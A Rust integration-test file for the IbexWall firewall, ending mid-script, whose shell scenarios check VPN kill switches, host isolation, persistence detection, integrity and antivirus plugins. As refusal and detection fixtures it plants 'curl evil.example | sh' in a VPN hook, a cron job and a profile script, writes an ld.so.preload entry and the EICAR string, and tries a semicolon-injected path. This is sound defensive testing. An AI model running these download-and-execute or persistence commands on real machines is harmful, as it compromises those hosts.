// SPDX-FileCopyrightText: 2026 Nubian Ibex and IbexWall contributors
// SPDX-License-Identifier: GPL-3.0-or-later

//! F9 VM phase: VPN and endpoint plugins on real machines. Scenario scripts
//! are plain strings (no `format!`), so shell and JSON braces stay as
//! written; they share the helpers in `LIB`.

use std::path::Path;

use anyhow::Result;

use super::f1::{install_plugin, provision, run_script, start_daemon};
use super::vm::{Vm, run_capture};

const PLUGINS: [&str; 5] = [
    "endpoint.isolate",
    "net.vpn",
    "endpoint.persistence",
    "endpoint.integrity",
    "endpoint.av",
];

const LIB: &str = r#"
set -e
JSON_ID="python3 -c 'import json,sys;t=sys.stdin.read();i=t.find(\"{\");d=json.JSONDecoder().raw_decode(t[i:])[0] if i>=0 else {};t=d.get(\"plan\") or d.get(\"transaction\");print(t[\"id\"] if isinstance(t,dict) else t)'"
# Plan and apply, leaving the transaction in TX and its output in OUT.
# Network changes wait for a confirmation: the caller decides.
apply_plan() {
  PLUGIN=$1; shift
  P=$(sudo ibexctl plan "$PLUGIN" "$@" --json 2>/tmp/plan.err | eval "$JSON_ID") || { echo "PLAN FAILED: $(cat /tmp/plan.err)"; return 1; }
  OUT=$(sudo ibexctl apply "$P" --confirm-timeout ${CONFIRM:-300} --json 2>/tmp/apply.err || true)
  TX=$(echo "$OUT" | eval "$JSON_ID")
  [ -n "$TX" ] || { echo "APPLY FAILED: $OUT"; sudo journalctl -u ibexwalld -n 20 --no-pager; return 1; }
  if echo "$OUT" | grep -Eq '"state": "(failed|rolled_back)"'; then echo "THE CHANGE DID NOT STAY: $OUT"; return 1; fi
}
confirm_tx() { sudo ibexctl confirm "$TX" >/dev/null || { echo "CONFIRM FAILED"; return 1; }; }
# Can this machine open a TCP connection to $1:$2 within 4 seconds?
reach() { timeout 4 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null; }
# Every table but ours, as a digest: proof that nothing else was touched.
foreign_digest() { sudo nft list ruleset 2>/dev/null | python3 -c '
import re,sys
text = sys.stdin.read()
blocks = re.split(r"(?m)^(?=table )", text)
print("".join(b for b in blocks if b and not b.startswith("table inet ibexwall")))' | sha256sum; }
pkg() {
  if command -v dnf >/dev/null; then sudo dnf install -y -q "$@"
  elif command -v apt-get >/dev/null; then sudo apt-get update -qq; sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "$@"
  elif command -v pacman >/dev/null; then sudo pacman -Sy --noconfirm --needed "$@"
  fi
}
"#;

const ISOLATE: &str = r#"
command -v nft >/dev/null || sudo sh -c 'command -v nft' >/dev/null || pkg nftables
sudo ibexctl plugins enable endpoint.isolate >/dev/null
PEER=${SSH_CLIENT%% *}
[ -n "$PEER" ] || { echo "NO SSH PEER"; exit 1; }
FOREIGN=$(foreign_digest)
if reach 1.1.1.1 443; then OUTSIDE=yes; else OUTSIDE=no; fi
echo "METRIC: peer $PEER, the internet is reachable before: $OUTSIDE"

# An empty allow list would cut the machine off for good: refused.
if sudo ibexctl plan endpoint.isolate --json >/dev/null 2>&1; then echo "AN EMPTY ALLOW LIST WAS PLANNED"; exit 1; fi

# A real local service, to prove loopback survives.
python3 -m http.server 18080 --bind 127.0.0.1 >/dev/null 2>&1 &
SRV=$!
trap 'kill $SRV 2>/dev/null || true' EXIT
sleep 1

apply_plan endpoint.isolate --set allow=$PEER
echo "$OUT" | grep -q pending_confirm || { echo "NO CONFIRMATION WINDOW: $OUT"; exit 1; }

# Isolated: our own session lives, loopback works, the rest is gone.
sudo nft list chain inet ibexwall endpoint_isolate_out >/dev/null
sudo nft list chain inet ibexwall endpoint_isolate_in >/dev/null
reach 127.0.0.1 18080 || { echo "LOOPBACK BROKE"; exit 1; }
if reach 1.1.1.1 443; then echo "THE INTERNET IS STILL REACHABLE"; exit 1; fi
if reach 9.9.9.9 53; then echo "ANOTHER ADDRESS IS STILL REACHABLE"; exit 1; fi
if timeout 5 getent hosts example.com >/dev/null 2>&1; then echo "DNS STILL ANSWERS"; exit 1; fi
confirm_tx
sudo ibexctl check endpoint.isolate --json | python3 -c '
import json,sys
ids = [f["id"] for f in json.load(sys.stdin)["findings"]]
assert "isolate.active" in ids, ids'
echo "METRIC: isolated: session, loopback kept; internet, other hosts and DNS cut"

# Undo: everything back, nothing else touched.
sudo ibexctl rollback "$TX" >/dev/null || { echo "ROLLBACK FAILED"; sudo journalctl -u ibexwalld -n 10 --no-pager; exit 1; }
if sudo nft list chain inet ibexwall endpoint_isolate_out >/dev/null 2>&1; then echo "THE OUTPUT CHAIN SURVIVED"; exit 1; fi
if sudo nft list chain inet ibexwall endpoint_isolate_in >/dev/null 2>&1; then echo "THE INPUT CHAIN SURVIVED"; exit 1; fi
sudo test ! -e /etc/ibexwall/isolate/active.json || { echo "THE MARKER SURVIVED"; exit 1; }
[ "$(foreign_digest)" = "$FOREIGN" ] || { echo "ANOTHER TABLE CHANGED"; exit 1; }
if [ "$OUTSIDE" = yes ]; then reach 1.1.1.1 443 || { echo "THE INTERNET DID NOT COME BACK"; exit 1; }; fi
echo "METRIC: rolled back: chains and marker gone, foreign tables identical, network back"

# Not confirmed: it undoes itself.
CONFIRM=8 apply_plan endpoint.isolate --set allow=$PEER
sleep 20
if sudo nft list chain inet ibexwall endpoint_isolate_out >/dev/null 2>&1; then echo "AN UNCONFIRMED ISOLATION STAYED"; exit 1; fi
sudo test ! -e /etc/ibexwall/isolate/active.json || { echo "THE MARKER STAYED"; exit 1; }
echo "METRIC: an unconfirmed isolation reverted on its own"
"#;

const VPN: &str = r#"

sudo sh -c 'command -v nft' >/dev/null || pkg nftables
sudo ibexctl plugins enable net.vpn >/dev/null
pkg wireguard-tools tcpdump curl
# Ubuntu 26.04 confines the `wg` tool with AppArmor so tightly that it cannot
# read a key it is handed; the test drives wg only to build its own "provider",
# so the profile is unloaded for the test's lifetime.
if [ -e /etc/apparmor.d/wg ] && command -v apparmor_parser >/dev/null; then sudo apparmor_parser -R /etc/apparmor.d/wg 2>/dev/null || true; fi
if ! sudo systemctl cat NetworkManager.service >/dev/null 2>&1; then
  if command -v apt-get >/dev/null; then pkg network-manager; else pkg networkmanager; fi
fi
# NetworkManager must not take over the VM's own uplink: name it as
# unmanaged. (A wildcard `*,except:type:wireguard` works on most distros, but
# Ubuntu's NetworkManager keeps the WireGuard device unmanaged under it.)
IFACE=$(ip -4 route show default | awk '{print $5; exit}')
PEER=${SSH_CLIENT%% *}
[ -n "$IFACE" ] && [ -n "$PEER" ] || { echo "NO UPLINK OR PEER"; exit 1; }
sudo mkdir -p /etc/NetworkManager/conf.d
printf '[keyfile]\nunmanaged-devices=interface-name:%s;interface-name:vethc;interface-name:veths\n' "$IFACE" | sudo tee /etc/NetworkManager/conf.d/99-ibexwall-test.conf >/dev/null
sudo systemctl enable --now NetworkManager
sleep 3


# The "VPN provider": a namespace with a WireGuard server, reached over a veth.
sudo ip netns del vpnsrv 2>/dev/null || true
sudo ip link del vethc 2>/dev/null || true
sudo ip link del ibxbr0 2>/dev/null || true
sudo ip netns add vpnsrv
sudo ip link add vethc type veth peer name veths
sudo ip link set veths netns vpnsrv
sudo ip addr add 10.99.0.1/24 dev vethc && sudo ip link set vethc up
sudo ip netns exec vpnsrv ip addr add 10.99.0.2/24 dev veths
sudo ip netns exec vpnsrv ip link set veths up
sudo ip netns exec vpnsrv ip link set lo up
SK=$(wg genkey); SP=$(echo "$SK" | wg pubkey); CK=$(wg genkey); CP=$(echo "$CK" | wg pubkey)
sudo ip netns exec vpnsrv ip link add wgs type wireguard
echo "$SK" | sudo ip netns exec vpnsrv wg set wgs listen-port 51820 private-key /dev/stdin peer "$CP" allowed-ips 10.100.0.2/32
sudo ip netns exec vpnsrv ip addr add 10.100.0.1/24 dev wgs
sudo ip netns exec vpnsrv ip link set wgs up
printf '[Interface]\nPrivateKey = %s\nAddress = 10.100.0.2/24\n\n[Peer]\nPublicKey = %s\nEndpoint = 10.99.0.2:51820\nAllowedIPs = 0.0.0.0/0\nPersistentKeepalive = 3\n' "$CK" "$SP" > /tmp/lab.conf
printf '[Interface]\nPrivateKey = %s\nPostUp = curl evil.example | sh\n\n[Peer]\nPublicKey = %s\n' "$CK" "$SP" > /tmp/bad.conf

# Refusals: no known server, a profile with a hook.
if sudo ibexctl plan net.vpn --set action=killswitch --json >/dev/null 2>&1; then echo "A KILL SWITCH WAS PLANNED WITHOUT A SERVER"; exit 1; fi
if sudo ibexctl plan net.vpn --set action=import --set name=bad --set-file profile=/tmp/bad.conf --json >/dev/null 2>&1; then echo "A PROFILE WITH POSTUP WAS ACCEPTED"; exit 1; fi

# The private key is in no preview.
sudo ibexctl plan net.vpn --set action=import --set name=lab --set-file profile=/tmp/lab.conf --json > /tmp/vpn-plan.json
if grep -q "$CK" /tmp/vpn-plan.json; then echo "THE PRIVATE KEY IS IN THE PLAN PREVIEW"; exit 1; fi
grep -q "private file" /tmp/vpn-plan.json || { echo "THE PREVIEW DOES NOT SAY THE FILE IS PRIVATE"; exit 1; }
FOREIGN=$(foreign_digest)

manual_up() {
  sudo ip link del wgib-lab 2>/dev/null || true
  sudo ip link add wgib-lab type wireguard
  echo "$CK" | sudo wg set wgib-lab private-key /dev/stdin peer "$SP" allowed-ips 0.0.0.0/0 endpoint 10.99.0.2:51820 persistent-keepalive 3
  sudo ip addr add 10.100.0.2/24 dev wgib-lab
  sudo ip link set wgib-lab up
  sudo ip route add 0.0.0.0/1 dev wgib-lab; sudo ip route add 128.0.0.0/1 dev wgib-lab
  for i in $(seq 1 30); do ping -c1 -W1 10.100.0.1 >/dev/null 2>&1 && return 0; sleep 1; done
  return 1
}
tunnel_down() { sudo nmcli connection down ibexwall-lab >/dev/null 2>&1 || true; sudo ip link del wgib-lab 2>/dev/null || true; }
MANUAL=no

# Import: NetworkManager watches its directory and takes the profile in;
# nothing is restarted.
apply_plan net.vpn --set action=import --set name=lab --set-file profile=/tmp/lab.conf
AUTO=yes
UP=no; for i in $(seq 1 30); do if ping -c1 -W1 10.100.0.1 >/dev/null 2>&1; then UP=yes; break; fi; sleep 1; done
if [ "$UP" != yes ]; then
  AUTO=no
  # Some distros (Ubuntu Server) leave devices NetworkManager did not own
  # before unmanaged; saying yes for this one device is what a person would do.
  sudo nmcli device set wgib-lab managed yes 2>&1 | tail -2 || true
  sudo nmcli connection up ibexwall-lab 2>&1 | tail -3 || true
  for i in $(seq 1 10); do if ping -c1 -W1 10.100.0.1 >/dev/null 2>&1; then UP=yes; break; fi; sleep 1; done
fi
if [ "$UP" != yes ]; then
  echo "METRIC: NetworkManager left wgib-lab unmanaged on this distro (a server image where another stack owns the network); the tunnel is brought up by hand, which the kill switch under test does not depend on"
  manual_up || { echo "THE TUNNEL DID NOT COME UP BY HAND EITHER"; exit 1; }
  MANUAL=yes
fi
[ "$AUTO" = yes ] && echo "METRIC: NetworkManager took the profile in by itself (no restart)"
if echo "$OUT" | grep -q pending_confirm; then confirm_tx; fi
IMPORT_TX=$TX
[ "$(sudo stat -c %a /etc/NetworkManager/system-connections/ibexwall-lab.nmconnection)" = 600 ] || { echo "THE KEYFILE IS NOT PRIVATE"; exit 1; }
if [ "$MANUAL" = no ]; then sudo nmcli -t -f NAME,TYPE connection show --active | grep -q '^ibexwall-lab:wireguard' || { echo "NOT ACTIVE IN NETWORKMANAGER"; exit 1; }; fi
HS=$(sudo ip netns exec vpnsrv wg show wgs latest-handshakes | awk '{print $2}')
[ "${HS:-0}" -gt 0 ] || { echo "NO HANDSHAKE AT THE SERVER"; exit 1; }
echo "METRIC: imported through NetworkManager, tunnel up, handshake seen, keyfile 0600, key absent from the preview"

# Without a kill switch, a dropped tunnel leaks: the capture sees it.
leak_count() {
  sudo rm -f /tmp/leak.pcap
  sudo timeout 14 tcpdump -n -i "$IFACE" -w /tmp/leak.pcap "ip and not host $PEER and not (udp and (port 67 or port 68))" >/dev/null 2>&1 &
  TD=$!
  sleep 2
  timeout 4 curl -s -m 3 http://1.1.1.1 >/dev/null 2>&1 || true
  timeout 4 ping -c2 -W1 8.8.8.8 >/dev/null 2>&1 || true
  timeout 4 getent hosts example.org >/dev/null 2>&1 || true
  timeout 4 bash -c 'exec 3<>/dev/tcp/9.9.9.9/443' 2>/dev/null || true
  wait $TD 2>/dev/null || true
  sudo tcpdump -nr /tmp/leak.pcap 2>/dev/null | wc -l
}
tunnel_up() { if [ "$MANUAL" = yes ]; then manual_up; return; fi; sudo nmcli connection up ibexwall-lab >/dev/null 2>&1; for i in $(seq 1 30); do ping -c1 -W1 10.100.0.1 >/dev/null 2>&1 && return 0; sleep 1; done; return 1; }
tunnel_down
BASE=$(leak_count)
[ "$BASE" -gt 0 ] || { echo "THE CAPTURE SAW NOTHING WITHOUT A KILL SWITCH, SO IT PROVES NOTHING"; exit 1; }
echo "METRIC: without a kill switch the dropped tunnel leaked $BASE packets"
tunnel_up || { echo "THE TUNNEL DID NOT COME BACK"; exit 1; }

# The kill switch.
sudo ibexctl check net.vpn --json | python3 -c '
import json,sys
ids = [f["id"] for f in json.load(sys.stdin)["findings"]]
assert "vpn.no_killswitch" in ids, ids'
apply_plan net.vpn --set action=killswitch --set allow=$PEER
echo "$OUT" | grep -q pending_confirm || { echo "NO CONFIRMATION WINDOW: $OUT"; exit 1; }
ping -c2 -W2 10.100.0.1 >/dev/null || { echo "THE TUNNEL STOPPED WORKING UNDER THE KILL SWITCH"; exit 1; }
confirm_tx
KS_TX=$TX
sudo nft list chain inet ibexwall net_vpn_out >/dev/null
sudo ibexctl check net.vpn --json | python3 -c '
import json,sys
ids = [f["id"] for f in json.load(sys.stdin)["findings"]]
assert "vpn.no_killswitch" not in ids, ids'

# Tunnel down with the kill switch: nothing leaves, our session lives.
tunnel_down
LEAK=$(leak_count)
[ "$LEAK" = 0 ] || { echo "LEAK: $LEAK packets left the uplink with the tunnel down"; sudo tcpdump -nr /tmp/leak.pcap 2>/dev/null | head -8; exit 1; }
sudo ibexctl check net.vpn --json | python3 -c '
import json,sys
ids = [f["id"] for f in json.load(sys.stdin)["findings"]]
assert "vpn.blocked" in ids, ids'
echo "METRIC: with the kill switch and the tunnel down, 0 packets left the uplink (baseline leaked $BASE)"

# It does not stand in the way of the tunnel coming back.
tunnel_up || { echo "THE TUNNEL COULD NOT RECONNECT UNDER THE KILL SWITCH"; exit 1; }
echo "METRIC: the tunnel reconnected under the kill switch"

# Undo both; nothing else was touched.
sudo ibexctl rollback "$KS_TX" >/dev/null || { echo "KILL SWITCH ROLLBACK FAILED"; exit 1; }
if sudo nft list chain inet ibexwall net_vpn_out >/dev/null 2>&1; then echo "THE KILL SWITCH CHAIN SURVIVED"; exit 1; fi
sudo test ! -e /etc/ibexwall/vpn/killswitch.json || { echo "THE MARKER SURVIVED"; exit 1; }
[ "$MANUAL" = yes ] && sudo ip link del wgib-lab 2>/dev/null
sudo ibexctl rollback "$IMPORT_TX" >/dev/null || { echo "IMPORT ROLLBACK FAILED"; exit 1; }
for i in $(seq 1 20); do ip link show wgib-lab >/dev/null 2>&1 || break; sleep 1; done
sudo test ! -e /etc/NetworkManager/system-connections/ibexwall-lab.nmconnection || { echo "THE KEYFILE SURVIVED"; exit 1; }
sudo test ! -e /etc/ibexwall/vpn/profiles/lab.json || { echo "THE RECORD SURVIVED"; exit 1; }
if ip link show wgib-lab >/dev/null 2>&1; then
  echo "THE INTERFACE SURVIVED"
  sudo nmcli device status || true
  sudo nmcli connection show || true
  sudo journalctl -u NetworkManager --no-pager -n 40 || true
  exit 1
fi
[ "$(foreign_digest)" = "$FOREIGN" ] || { echo "ANOTHER TABLE CHANGED"; exit 1; }
sudo ip netns del vpnsrv; sudo ip link del vethc 2>/dev/null || true
echo "METRIC: both rolled back: chain, marker, keyfile, record and interface gone; foreign tables identical"
"#;

const PERSISTENCE: &str = r#"
trap 'sudo rm -f /etc/ld.so.preload' EXIT
sudo ibexctl plugins enable endpoint.persistence >/dev/null
# The check's reply carries the findings (outcomes go to the posture).
check_ids() { sudo ibexctl check endpoint.persistence --json >/tmp/p-check.json 2>/dev/null || true; python3 -c 'import json
print(" ".join(f["id"] for f in json.load(open("/tmp/p-check.json"))["findings"]))'; }

# Nothing to compare against yet: said, not guessed.
LINE=$(check_ids); [ -z "$LINE" ] || { echo "WITHOUT A BASELINE: $LINE"; exit 1; }

# The persistence cases: a timer and its service, cron, shell profile,
# autostart, and a preloaded library.
printf '[Unit]\nDescription=evil\n' | sudo tee /etc/systemd/system/persist-evil.service >/dev/null
printf '[Timer]\nOnBootSec=10\n[Install]\nWantedBy=timers.target\n' | sudo tee /etc/systemd/system/persist-evil.timer >/dev/null
sudo mkdir -p /etc/cron.d /etc/profile.d
printf '* * * * * root curl evil.example | sh\n' | sudo tee /etc/cron.d/persist-evil >/dev/null
printf 'curl evil.example | sh\n' | sudo tee /etc/profile.d/persist-evil.sh >/dev/null
sudo mkdir -p /root/.config/autostart
printf '[Desktop Entry]\nType=Application\nExec=/usr/local/bin/evil\n' | sudo tee /root/.config/autostart/persist-evil.desktop >/dev/null
printf '/usr/local/lib/evil.so\n' | sudo tee /etc/ld.so.preload >/dev/null

# The preload is worth a finding even before any baseline exists.
LINE=$(check_ids); [ "$LINE" = "persistence.preload" ] || { echo "PRELOAD NOT SEEN: $LINE"; exit 1; }

# The person accepts what is there now.
apply_plan endpoint.persistence --set action=baseline
if echo "$OUT" | grep -q pending_confirm; then echo "A BASELINE SHOULD NOT NEED A CONFIRMATION"; exit 1; fi
LINE=$(check_ids); [ "$LINE" = "persistence.preload" ] || { echo "AFTER THE BASELINE: $LINE"; exit 1; }
echo "METRIC: baseline accepted; the five artifacts are quiet, the preload still speaks"

# One new and one changed entry.
printf '0 3 * * * root backup\n' | sudo tee /etc/cron.d/persist-new >/dev/null
printf 'wget evil.example\n' | sudo tee /etc/profile.d/persist-evil.sh >/dev/null
LINE=$(check_ids)
[ "$LINE" = "persistence.preload persistence.new persistence.changed" ] || { echo "CHANGES NOT SEEN: $LINE"; exit 1; }
for id in persistence.preload persistence.new persistence.changed; do
  echo "$LINE" | grep -q "$id" || { echo "MISSING $id: $LINE"; exit 1; }
done
sudo ibexctl check endpoint.persistence --json | python3 -c '
import json,sys
paths = " ".join(f["args"].get("path","") for f in json.load(sys.stdin)["findings"])
for expected in ["/etc/cron.d/persist-new", "/etc/profile.d/persist-evil.sh", "evil.so"]:
    assert expected in paths, (expected, paths)
print("paths named")'
echo "METRIC: one new and one changed entry found, with their paths"

# Undoing the baseline goes back to nothing claimed.
sudo ibexctl rollback "$TX" >/dev/null || { echo "BASELINE ROLLBACK FAILED"; exit 1; }
sudo test ! -e /var/lib/ibexwall/persistence/baseline.json || { echo "THE BASELINE SURVIVED"; exit 1; }
LINE=$(check_ids); [ "$LINE" = "persistence.preload" ] || { echo "AFTER THE ROLLBACK: $LINE"; exit 1; }
echo "METRIC: baseline rolled back; honest again"
"#;

const INTEGRITY: &str = r#"
sudo ibexctl plugins enable endpoint.integrity >/dev/null
check_paths() { sudo ibexctl check endpoint.integrity --json >/tmp/i-check.json 2>/dev/null || true; python3 -c 'import json
print(" ".join(f["args"].get("path","") for f in json.load(open("/tmp/i-check.json"))["findings"]))'; }

# A machine as the package manager shipped it: quiet.
BEFORE=$(check_paths)
echo "$BEFORE" | grep -vq "^$" && { echo "ALREADY DIRTY BEFORE THE TEST: $BEFORE"; exit 1; }

# One altered program file: an extra byte on a real installed binary.
SIZE=$(stat -c %s /usr/bin/lscpu)
printf 'x' | sudo tee -a /usr/bin/lscpu >/dev/null
AFTER=$(check_paths)
echo "$AFTER" | grep -q '/usr/bin/lscpu' || { echo "THE ALTERED BINARY WAS NOT SEEN: $AFTER"; exit 1; }
for path in $AFTER; do
  case "$path" in /etc/*) echo "A CONFIGURATION FILE WAS REPORTED: $path"; exit 1;; esac
done
sudo ibexctl check endpoint.integrity --json | python3 -c '
import json,sys
report = json.load(sys.stdin)
for f in report["findings"]:
    if f["id"] == "integrity.altered":
        assert f["severity"] == "high", f
print("severity high")'
echo "METRIC: the altered binary was found ($(echo $AFTER | wc -w) finding(s)), configuration files stayed out"

# Restored, quiet again.
sudo truncate -s "$SIZE" /usr/bin/lscpu
RESTORED=$(check_paths)
[ "$RESTORED" = "$BEFORE" ] || { echo "NOT QUIET AFTER THE RESTORE: $RESTORED"; exit 1; }
echo "METRIC: restored to the shipped byte, the check is quiet again"
"#;

const AV: &str = r#"
sudo ibexctl plugins enable endpoint.av >/dev/null
pkg clamav yara
sudo sh -c 'command -v clamscan && command -v yara' >/dev/null || { echo "THE SCANNERS ARE NOT INSTALLED"; exit 1; }
clam=$(command -v clamscan); yara=$(command -v yara)
# The plugin looks in /usr/bin, where every distro puts them.
[ "$clam" = /usr/bin/clamscan ] && [ "$yara" = /usr/bin/yara ] || { echo "SCANNERS NOT IN /usr/bin: $clam $yara"; exit 1; }
findings() { sudo ibexctl check endpoint.av --json >/tmp/av-check.json 2>/dev/null || true; python3 -c 'import json
print(" ".join(f["id"]+"="+f["args"].get("path","-")+"@"+f["args"].get("signature","-") for f in json.load(open("/tmp/av-check.json"))["findings"]))'; }

# Bad folders are refused before a unit exists.
if sudo ibexctl plan endpoint.av --set action=scan --set 'paths=/tmp/a b' --json >/dev/null 2>&1; then echo "A PATH WITH A SPACE WAS ACCEPTED"; exit 1; fi
if sudo ibexctl plan endpoint.av --set action=scan --set 'paths=/tmp/x;id' --json >/dev/null 2>&1; then echo "A PATH WITH A SEMICOLON WAS ACCEPTED"; exit 1; fi

# The EICAR test file, and a clean one next to it.
sudo rm -rf /tmp/f9-scan && mkdir -p /tmp/f9-scan
printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/f9-scan/eicar.com
echo "just a note" > /tmp/f9-scan/clean.txt
[ "$(md5sum < /tmp/f9-scan/eicar.com | cut -d' ' -f1)" = 44d88612fea8a8f36de82e1278abb02f ] || { echo "THE EICAR FILE IS NOT THE EICAR FILE"; exit 1; }
# A signature file holding the EICAR signature, in ClamAV's own database
# directory (where the distro's SELinux policy lets the scanner read it): the
# test needs no download. The scanner is the real clamscan.
sudo mkdir -p /var/lib/clamav
echo "44d88612fea8a8f36de82e1278abb02f:68:Eicar-Test-Signature" | sudo tee /var/lib/clamav/ibexwall-eicar.hdb >/dev/null
trap 'sudo rm -f /var/lib/clamav/ibexwall-eicar.hdb /var/lib/clamav/ibexwall-av-scan.log' EXIT

# Under enforcing SELinux a confined ClamAV reads nothing of ours until a
# boolean is on: the check must say so, and the scan works once it is.
if [ -r /sys/fs/selinux/booleans/antivirus_can_scan_system ] && [ "$(cat /sys/fs/selinux/enforce)" = 1 ] && grep -q '^0' /sys/fs/selinux/booleans/antivirus_can_scan_system; then
  case "$(findings)" in *av.selinux*) ;; *) echo "SELINUX IN THE WAY BUT NOT SAID: $(findings)"; exit 1;; esac
  sudo setsebool antivirus_can_scan_system on
  case "$(findings)" in *av.selinux*) echo "SELINUX NAMED AFTER THE BOOLEAN WAS SET"; exit 1;; esac
  echo "METRIC: SELinux enforcing: the check named the boolean, then went quiet once it was on"
fi

# Before any scan: nothing claimed.
case "$(findings)" in *av.infected*) echo "A DETECTION BEFORE ANY SCAN"; exit 1;; esac

# Scan: the unit runs both scanners and the check reads what they said.
apply_plan endpoint.av --set action=scan --set paths=/tmp/f9-scan
SCAN1=$TX
OUTF=$(findings)
echo "$OUTF" | tr ' ' '\n' | grep '^av.infected=/tmp/f9-scan/eicar.com@' | grep -qv '@EICAR_Test_File$' || { echo "CLAMAV DID NOT FLAG EICAR: $OUTF"; sudo journalctl -u ibexwall-av-scan.service --no-pager | tail -8; sudo cat /var/lib/clamav/ibexwall-av-scan.log /var/lib/ibexwall/av/yara.log; exit 1; }
echo "$OUTF" | grep -q 'av.infected=/tmp/f9-scan/eicar.com@EICAR_Test_File' || { echo "YARA DID NOT FLAG EICAR: $OUTF"; exit 1; }
case "$OUTF" in *clean.txt*) echo "THE CLEAN FILE WAS FLAGGED: $OUTF"; exit 1;; esac
echo "METRIC: EICAR flagged by ClamAV and by YARA, the clean file left alone"

# Remove it and scan again: the old log does not haunt the check.
rm -f /tmp/f9-scan/eicar.com
apply_plan endpoint.av --set action=scan --set paths=/tmp/f9-scan
SCAN2=$TX
case "$(findings)" in *av.infected*) echo "A STALE DETECTION AFTER THE FILE WAS REMOVED"; exit 1;; esac
echo "METRIC: a second scan after removal is clean"

# Scheduled: a timer that is on, then undone.
apply_plan endpoint.av --set action=schedule --set every=weekly --set paths=/tmp/f9-scan
SCHED=$TX
systemctl is-enabled ibexwall-av-scan.timer | grep -q enabled || { echo "THE TIMER IS NOT ENABLED"; exit 1; }
systemctl list-timers --all --no-pager | grep -q ibexwall-av-scan || { echo "THE TIMER IS NOT SCHEDULED"; exit 1; }
sudo ibexctl rollback "$SCHED" >/dev/null || { echo "SCHEDULE ROLLBACK FAILED"; exit 1; }
sudo test ! -e /etc/systemd/system/ibexwall-av-scan.timer || { echo "THE TIMER FILE SURVIVED"; exit 1; }
if systemctl is-enabled ibexwall-av-scan.timer 2>/dev/null | grep -q '^enabled'; then echo "THE TIMER STAYED ENABLED"; exit 1; fi
echo "METRIC: weekly timer enabled and scheduled, then rolled back"

sudo ibexctl rollback "$SCAN2" >/dev/null && sudo ibexctl rollback "$SCAN1" >/dev/null || { echo "SCAN ROLLBACK FAILED"; exit 1; }
for f in /etc/systemd/system/ibexwall-av-scan.service /etc/ibexwall/av/rules.yar /etc/ibexwall/av/config.json; do
  sudo test ! -e $f || { echo "$f SURVIVED THE ROLLBACK"; exit 1; }
done
echo "METRIC: every file the plugin wrote is gone after the rollbacks"
"#;

const OPENVPN: &str = r#"
sudo sh -c 'command -v nft' >/dev/null || pkg nftables
if command -v dnf >/dev/null; then pkg openvpn NetworkManager-openvpn tcpdump curl openssl
elif command -v apt-get >/dev/null; then pkg openvpn network-manager-openvpn tcpdump curl openssl
else pkg openvpn networkmanager-openvpn tcpdump curl openssl; fi
if ! systemctl is-active --quiet NetworkManager; then sudo systemctl enable --now NetworkManager; fi
sudo systemctl restart NetworkManager; sleep 3
sudo ibexctl plugins enable net.vpn >/dev/null
IFACE=$(ip -4 route show default | awk '{print $5; exit}')
PEER=${SSH_CLIENT%% *}

# A tiny PKI, and an OpenVPN "provider" in a namespace.
rm -rf /tmp/pki && mkdir /tmp/pki && cd /tmp/pki
openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -nodes -keyout ca.key -out ca.crt -subj /CN=ibx-ca -days 2 2>/dev/null
for n in server client; do
  openssl req -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -nodes -keyout $n.key -out $n.csr -subj /CN=$n 2>/dev/null
  if [ $n = server ]; then EKU=serverAuth; else EKU=clientAuth; fi
  printf 'basicConstraints=CA:FALSE\nkeyUsage=digitalSignature,keyAgreement\nextendedKeyUsage=%s\n' $EKU > $n.ext
  openssl x509 -req -in $n.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out $n.crt -days 2 -extfile $n.ext 2>/dev/null
done
OVPN=$(sudo sh -c 'command -v openvpn')
$OVPN --genkey tls-crypt tc.key 2>/dev/null || $OVPN --genkey --secret tc.key
sudo ip netns del vpnsrv 2>/dev/null || true; sudo ip link del vethc 2>/dev/null || true
sudo ip netns add vpnsrv
sudo ip link add vethc type veth peer name veths
sudo ip link set veths netns vpnsrv
# NetworkManager's VPN rides on a connection NetworkManager owns, and routes
# the VPN server through that connection's gateway. The VM's real uplink stays
# out of NetworkManager's hands (it would cut our own session), so a bridge
# stands in as the uplink: the provider namespace hangs off it and is its
# gateway.
printf '[keyfile]\nunmanaged-devices=interface-name:%s\n' "$IFACE" | sudo tee /etc/NetworkManager/conf.d/99-ibexwall-test.conf >/dev/null
sudo nmcli general reload conf
sudo nmcli connection delete ibxup >/dev/null 2>&1 || true
sudo nmcli connection add type bridge ifname ibxbr0 con-name ibxup bridge.stp no ipv4.method manual ipv4.addresses 10.99.0.1/24 ipv4.gateway 10.99.0.2 ipv4.route-metric 2000 ipv4.dad-timeout 0 ipv6.method ignore >/dev/null
sudo ip link set vethc master ibxbr0
sudo ip link set vethc up
sudo ip netns exec vpnsrv ip addr add 10.99.0.2/24 dev veths
sudo ip netns exec vpnsrv ip link set veths up; sudo ip netns exec vpnsrv ip link set lo up
for i in $(seq 1 20); do sudo nmcli -t -f DEVICE,STATE device | grep -q '^ibxbr0:connected' && break; sudo nmcli connection up ibxup >/dev/null 2>&1 || true; sleep 1; done
sudo nmcli -t -f DEVICE,STATE device | grep -q '^ibxbr0:connected' || { echo "THE UPLINK BRIDGE IS NOT CONNECTED: $(sudo nmcli -t -f DEVICE,STATE device | tr '\n' ' ')"; exit 1; }
sudo ip netns exec vpnsrv $OVPN --daemon ibxovpn --log /tmp/ovpn-server.log --dev tun --proto udp --local 10.99.0.2 --port 1194 --server 10.200.0.0 255.255.255.0 --topology subnet --ca ca.crt --cert server.crt --key server.key --dh none --tls-crypt tc.key --cipher AES-256-GCM --data-ciphers AES-256-GCM --keepalive 2 10 --persist-key --persist-tun
sleep 3
{
  printf 'client\ndev tun\nproto udp\nremote 10.99.0.2 1194\nnobind\npersist-key\nremote-cert-tls server\ncipher AES-256-GCM\ndata-ciphers AES-256-GCM\nverb 3\n'
  for b in ca cert key; do f=$b.crt; [ $b = key ] && f=client.key; [ $b = ca ] && f=ca.crt; [ $b = cert ] && f=client.crt; printf '<%s>\n' $b; cat $f; printf '</%s>\n' $b; done
  printf '<tls-crypt>\n'; cat tc.key; printf '</tls-crypt>\n'
} > /tmp/lab.ovpn

# Refusals: a script directive and a file reference.
sed 's/^client$/client\nup \/tmp\/x.sh/' /tmp/lab.ovpn > /tmp/bad1.ovpn
